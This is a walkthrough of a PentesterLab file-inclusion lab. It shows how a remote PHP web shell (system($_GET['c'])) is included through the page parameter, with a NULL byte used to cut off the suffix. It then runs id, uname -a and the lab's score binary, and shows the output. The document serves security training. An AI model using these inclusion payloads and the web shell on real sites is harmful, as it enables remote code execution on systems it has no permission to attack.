File Include 02

In a similar manner to directory traversal, this example adds its own suffix to the value provided. As before, you can get rid of the suffix (for LFI) using a NULL BYTE. For RFI, you can get rid of the suffix, by adding &blah= or ?blah= depending on your URL.

In this exercise, the code simulates the behaviour of older versions of PHP. PHP now correctly handles paths and they cannot be poisoned using a NULL BYTE, as they used to.

To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:
/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

Common Mistakes:
    * Make sure you replace the full netcat command with the score command followed by your UUID: /usr/local/bin/score ....

 You can access this exercise using the following URL: http://ptc-ce5b19e9-add0839c.libcurl.so/. 

Steps: 
    1)  Visit the given URL: http://ptc-ce5b19e9-add0839c.libcurl.so/ and it redirected to http://ptc-ce5b19e9-add0839c.libcurl.so/?page=intro.
    2)  We can use this malicious file http://assets.pentesterlab.com/test_include_system.txt as given in lab.
    3)  While opening the link we can see as:
                <?php 
        system($_GET['c']);
        ?>
    4)  Let's this upper link be redirected as: 
        http://ptc-ce5b19e9-add0839c.libcurl.so/?page=https://assets.pentesterlab.com/test_include_system.txt
        But it don't works.
    5)  We can notice we get c in above php code. And also use NULL BYTE Including id command let's see the id as below:
        http://ptc-ce5b19e9-add0839c.libcurl.so/?page=https://assets.pentesterlab.com/test_include_system.txt%00&c=id
        --> uid=33(www-data) gid=33(www-data) groups=33(www-data) 

    6)   So, we can see the id then we can load other system commands. Again let's replace 'id' with 'uname -a'in the parameter as:
        http://ptc-ce5b19e9-add0839c.libcurl.so/?page=https://assets.pentesterlab.com/test_include_system.txt%00&c=uname -a. 
        And we can see uname of the system. -->  Linux 9c344e22a259 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2 (2019-08-28) x86_64 GNU/Linux 
    7)  Then,let's replace 'uname -a' with '/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8'.
    8) Bravo! Exercise completed!! 

        Happy Hacking!! :)